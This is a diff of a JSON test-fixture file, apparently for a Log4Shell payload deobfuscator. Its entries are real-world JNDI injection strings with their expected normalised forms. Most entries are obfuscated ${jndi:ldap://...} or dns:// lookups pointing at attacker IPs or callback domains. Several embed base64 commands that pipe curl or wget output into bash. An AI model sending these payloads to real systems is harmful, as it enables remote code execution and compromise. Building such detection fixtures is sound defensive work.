@@ -1,530 +1,137 @@
 [
   {
-    "orig": "/?x=${jndi:ldap://${hostName}.c6rr05cpu892m69lgpo0cg55uyyy4pcze.interact.sh/a}",
-    "expected": ""
+    "original": "${${::-j}ndi:dns://45.83.64.1/securityscan-mqz6vcflt3ekussg}",
+    "expected": "${jndi:dns://45.83.64.1/securityscan-mqz6vcflt3ekussg}",
+    "deobfusc": ""
   },
   {
-    "orig": "/include?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
+    "original": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6rr05cpu892m69lgpo0cg55uyyy4pczq.interact.sh}",
+    "expected": "${jndi:ldap://${hostName}.c6rr05cpu892m69lgpo0cg55uyyy4pczq.interact.sh}",
+    "deobfusc": ""
   },
   {
-    "orig": "/api/v1?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
+    "original": "/?x=${jndi:ldap://1.${hostName}.c6rtdvcpu892hng6pe90cg56y3ay4pcze.interact.sh/1}",
+    "expected": "/?x=${jndi:ldap://1.${hostName}.c6rtdvcpu892hng6pe90cg56y3ay4pcze.interact.sh/1}",
+    "deobfusc": ""
   },
   {
-    "orig": "/update?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
+    "original": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${upper:p}://45.146.164.160:1389/t}",
+    "expected": "${jndi:ldap://45.146.164.160:1389/t}",
+    "deobfusc": ""
   },
   {
-    "orig": "/edit?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
+    "original": "${${lower:${lower:jndi}}:ld${lower:ap}://45.146.164.160:1389/t}",
+    "expected": "${jndi:ldap://45.146.164.160:1389/t}",
+    "deobfusc": ""
   },
   {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
-    "expected": ""
+    "original": "/?id=%24%7B%24%7B%3A%3A-j%7Dndi%3Adns%3A%2F%2F45.83.64.1%2Fsecurityscan-zprswjcuvllppuag%7D",
+    "expected": "/?id=${jndi:dns://45.83.64.1/securityscan-zprswjcuvllppuag}",
+    "deobfusc": ""
   },
   {
-    "orig": "/api/v1/users?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
+    "original": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6spqqb45qcg67a874h0cgh5mpayfyhdg.interact.sh}",
+    "expected": "${jndi:ldap://${hostName}.c6spqqb45qcg67a874h0cgh5mpayfyhdg.interact.sh}",
+    "deobfusc": ""
   },
   {
-    "orig": "/news/?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
+    "original": "/jndi",
+    "expected": "/jndi",
+    "deobfusc": ""
   },
   {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6spqqb45qcg67a874h0cgh5cjayfbjiw.interact.sh}",
-    "expected": ""
+    "original": "/user?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
+    "expected": "/user?username=${jndi:ldap://78.31.71.248:1389/8el8iu}",
+    "deobfusc": ""
   },
   {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6spqqb45qcg67a874h0cgh5mpayfyhdg.interact.sh}",
-    "expected": ""
+    "original": "/?x=${jndi:ldap://${hostName}.c6spqqb45qcg67a874h0cgh5mpayfyhdr.interact.sh/a}",
+    "expected": "/?x=${jndi:ldap://${hostName}.c6spqqb45qcg67a874h0cgh5mpayfyhdr.interact.sh/a}",
+    "deobfusc": ""
   },
   {
-    "orig": "/?x=${jndi:ldap://${hostName}.c6spqqb45qcg67a874h0cgh5cjayfbjio.interact.sh/a}",
-    "expected": ""
+    "original": "${jndi:ldap://78.31.71.248:1389/gfwwq7}",
+    "expected": "${jndi:ldap://78.31.71.248:1389/gfwwq7}",
+    "deobfusc": ""
   },
   {
-    "orig": "${${::-j}ndi:dns://45.83.64.1/securityscan-y34jea3p2zd3ylo2}",
-    "expected": ""
+    "original": "/api?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
+    "expected": "/api?q=${jndi:ldap://78.31.71.248:1389/gfwwq7}",
+    "deobfusc": ""
   },
   {
-    "orig": "/favicon.ico",
-    "expected": ""
+    "original": "/edit?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
+    "expected": "/edit?username=${jndi:ldap://78.31.71.248:1389/8el8iu}",
+    "deobfusc": ""
   },
   {
-    "orig": "curl/7.58.0",
-    "expected": ""
+    "original": "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox",
+    "expected": "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox",
+    "deobfusc": ""
   },
   {
-    "orig": "Oauth ${jndi:ldap://45.83.193.150:1389/Exploit}\n",
-    "expected": ""
+    "original": "/search?a=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
+    "expected": "/search?a=${jndi:ldap://78.31.71.248:1389/8el8iu}",
+    "deobfusc": ""
   },
   {
-    "orig": "/${jndi:ldap://185.224.139.151:1389/Exploit}",
-    "expected": ""
+    "original": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
+    "expected": "${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
+    "deobfusc": ""
   },
   {
-    "orig": "/?search=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
+    "original": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0Myl8YmFzaA==}",
+    "expected": "${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0Myl8YmFzaA==}",
+    "deobfusc": ""
   },
   {
-    "orig": "${${::-j}ndi:dns://45.83.64.1/securityscan-323a3ucegvyedy5m}",
-    "expected": ""
+    "original": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0Myl8YmFzaA==}",
+    "expected": "${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0Myl8YmFzaA==}",
+    "deobfusc": ""
   },
   {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://107.181.187.184:83/images.swiftcrypto.com}",
-    "expected": ""
+    "original": "/login",
+    "expected": "/login",
+    "deobfusc": ""
   },
   {
-    "orig": "/info?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
+    "original": "/${jndi:ldap://45.83.193.150:1389/Exploit}",
+    "expected": "/${jndi:ldap://45.83.193.150:1389/Exploit}",
+    "deobfusc": ""
   },
   {
-    "orig": "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox",
-    "expected": ""
+    "original": "/include?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
+    "expected": "/include?username=${jndi:ldap://78.31.71.248:1389/8el8iu}",
+    "deobfusc": ""
   },
   {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6rr05cpu892m69lgpo0cg55uyyy4pczk.interact.sh}",
-    "expected": ""
+    "original": "Bearer ${jndi:ldap://31.131.16.127:1389/Exploit}",
+    "expected": "Bearer ${jndi:ldap://31.131.16.127:1389/Exploit}",
+    "deobfusc": ""
   },
   {
-    "orig": "${${::-j}ndi:dns://45.83.64.1/securityscan-mqz6vcflt3ekussg}",
-    "expected": ""
+    "original": "/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0Myl8YmFzaA==}",
+    "expected": "/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0Myl8YmFzaA==}",
+    "deobfusc": ""
   },
   {
-    "orig": "Go-http-client/1.1",
-    "expected": ""
+    "original": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
+    "expected": "${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
+    "deobfusc": ""
   },
   {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6sbtqb45qcg14vb3pdgcghtb7yynsqrn.interact.sh}",
-    "expected": ""
+    "original": "${${::-j}ndi:dns://45.83.64.1/securityscan-dmteefws7xqnn5jp}",
+    "expected": "${jndi:dns://45.83.64.1/securityscan-dmteefws7xqnn5jp}",
+    "deobfusc": ""
   },
   {
-    "orig": "${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",
-    "expected": ""
+    "original": "${${lower:j}${lower:n}${lower:d}i:l${lower:d}${lower:a}p://45.146.164.160:1389/t}",
+    "expected": "${jndi:ldap://45.146.164.160:1389/t}",
+    "deobfusc": ""
   },
   {
-    "orig": "/login?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQ2LjEwMS44Ny4xNTE6ODApfGJhc2g=}",
-    "expected": ""
-  },
-  {
-    "orig": "/api/v1/users?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/api?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6sbtqb45qcg14vb3pdgcghtryaynztic.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "/system?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/api?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/?id=%24%7B%24%7B%3A%3A-j%7Dndi%3Adns%3A%2F%2F45.83.64.1%2Fsecurityscan-v6baopzhywmxucnd%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}ndi:dns://45.83.64.1/securityscan-xaijauyxcp7vdh54}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0Myl8YmFzaA==}",
-    "expected": ""
-  },
-  {
-    "orig": "/include?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0Myl8YmFzaA==}",
-    "expected": ""
-  },
-  {
-    "orig": "/news/?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://194.40.243.149:1534/Basic/Command/Base64/KGN1cmwgLXMgMTk0LjQwLjI0My4xNDkvbGguc2h8fHdnZXQgLXEgLU8tIDE5NC40MC4yNDMuMTQ5L2xoLnNoKXxiYXNo}",
-    "expected": ""
-  },
-  {
-    "orig": "/?q=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6spqqb45qcg67a874h0cgh5mpayfyhde.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "Token ${jndi:ldap://45.83.193.150:1389/Exploit}\n",
-    "expected": ""
-  },
-  {
-    "orig": "/jndi",
-    "expected": ""
-  },
-  {
-    "orig": "/api/login?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/?page=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/api/v1/?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0Myl8YmFzaA==}",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjQ0Myl8YmFzaA==}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6spqqb45qcg67a874h0cgh5cjayfbjis.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "/$%7Bjndi:ldap://45.83.193.150:1389/Exploit%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${upper:p}://45.146.164.160:1389/t}",
-    "expected": ""
-  },
-  {
-    "orig": "/data?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:ldap://45.83.193.150:1389/Exploit}",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}ndi:dns://45.83.64.1/securityscan-nwuix3uzmtisgahv}",
-    "expected": ""
-  },
-  {
-    "orig": "/update?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/search?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/?x=${jndi:ldap://${hostName}.c6spqqb45qcg67a874h0cgh5mpayfyhdr.interact.sh/a}",
-    "expected": ""
-  },
-  {
-    "orig": "/?x=${jndi:ldap://${hostName}.c6sbtqb45qcg14vb3pdgcghtryaynztig.interact.sh/a}",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://194.40.243.149:1534/Basic/Command/Base64/KGN1cmwgLXMgMTk0LjQwLjI0My4xNDkvbGguc2h8fHdnZXQgLXEgLU8tIDE5NC40MC4yNDMuMTQ5L2xoLnNoKXxiYXNo}",
-    "expected": ""
-  },
-  {
-    "orig": "/user?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
-    "expected": ""
-  },
-  {
-    "orig": "Bearer ${jndi:ldap://185.224.139.151:1389/Exploit}\n",
-    "expected": ""
-  },
-  {
-    "orig": "/api/login?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6rr05cpu892m69lgpo0cg55uyyy4pczq.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "/?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6spqqb45qcg67a874h0cgh5cjayfbji1.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0Myl8YmFzaA==}",
-    "expected": ""
-  },
-  {
-    "orig": "/api/v1/login?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/admin/login?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/page?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "Bearer ${jndi:ldap://45.83.193.150:1389/Exploit}\n",
-    "expected": ""
-  },
-  {
-    "orig": "/login?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/manager?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:ldap://78.31.71.248:1389/8el8iu}",
-    "expected": ""
-  },
-  {
-    "orig": "/?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/?id=%24%7B%24%7B%3A%3A-j%7Dndi%3Adns%3A%2F%2F45.83.64.1%2Fsecurityscan-zprswjcuvllppuag%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/?x=${jndi:ldap://1.${hostName}.c6rtdvcpu892hng6pe90cg56y3ay4pcze.interact.sh/1}",
-    "expected": ""
-  },
-  {
-    "orig": "/search?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:ldap://185.224.139.151:1389/Exploit}",
-    "expected": ""
-  },
-  {
-    "orig": "/admin/login?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/register?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/?x=${jndi:ldap://194.40.243.149:1534/Basic/Command/Base64/KGN1cmwgLXMgMTk0LjQwLjI0My4xNDkvbGguc2h8fHdnZXQgLXEgLU8tIDE5NC40MC4yNDMuMTQ5L2xoLnNoKXxiYXNo}",
-    "expected": ""
-  },
-  {
-    "orig": "/register?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6sbtqb45qcg14vb3pdgcghtb7yynsqrr.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "/${jndi:ldap://45.83.193.150:1389/Exploit}",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}ndi:dns://45.83.64.1/securityscan-dmteefws7xqnn5jp}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0M3x8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjQ0Myl8YmFzaA==}",
-    "expected": ""
-  },
-  {
-    "orig": "http://35.198.74.222:80/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzM1LjE5OC43NC4yMjI6ODApfGJhc2g=}",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6sbtqb45qcg14vb3pdgcghtryaynztie.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "/?id=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/info?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "Bearer ${jndi:ldap://31.131.16.127:1389/Exploit}\n",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://45.146.164.160:1389/t}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6rr05cpu892m69lgpo0cg55uyyy4pczc.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:ldap://31.131.16.127:1389/Exploit}",
-    "expected": ""
-  },
-  {
-    "orig": "/edit?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/${jndi:ldap://31.131.16.127:1389/Exploit}",
-    "expected": ""
-  },
-  {
-    "orig": "/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzM1LjE5OC43NC4yMjI6ODApfGJhc2g=}",
-    "expected": ""
-  },
-  {
-    "orig": "/data?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/login",
-    "expected": ""
-  },
-  {
-    "orig": "curl/7.29.0",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://3.${hostName}.c6rtdvcpu892hng6pe90cg56y3ay4pczc.interact.sh/3}",
-    "expected": ""
-  },
-  {
-    "orig": "/",
-    "expected": ""
-  },
-  {
-    "orig": "/?s=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/user?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/page?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "Mozilla/5.0 zgrab/0.x",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}ndi:dns://45.83.64.1/securityscan-ncfpel46zrhvuy7l}",
-    "expected": ""
-  },
-  {
-    "orig": "/?x=${jndi:ldap://${hostName}.c6sbtqb45qcg14vb3pdgcghtb7yynsqry.interact.sh/a}",
-    "expected": ""
-  },
-  {
-    "orig": "${${lower:j}${lower:n}${lower:d}i:l${lower:d}${lower:a}p://45.146.164.160:1389/t}",
-    "expected": ""
-  },
-  {
-    "orig": "/api/v1/?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "/manager?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS4xOTguNzQuMjIyOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzM1LjE5OC43NC4yMjI6ODApfGJhc2g=}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:ldap://log4shell.huntress.com:1389/4ac61c12-0c8c-4552-95f0-dfa4053b4577}",
-    "expected": ""
-  },
-  {
-    "orig": "http://46.101.87.151:80/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQ2LjEwMS44Ny4xNTE6ODApfGJhc2g=}",
-    "expected": ""
-  },
-  {
-    "orig": "/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80Ni4xMDEuODcuMTUxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQ2LjEwMS44Ny4xNTE6ODApfGJhc2g=}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:ldap://78.31.71.248:1389/gfwwq7}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6spqqb45qcg67a874h0cgh5mpayfyhdk.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "/api/v1/login?username=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6sbtqb45qcg14vb3pdgcghtb7yynsqrg.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://2.${hostName}.c6rtdvcpu892hng6pe90cg56y3ay4pczk.interact.sh/2}",
-    "expected": ""
-  },
-  {
-    "orig": "/system?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
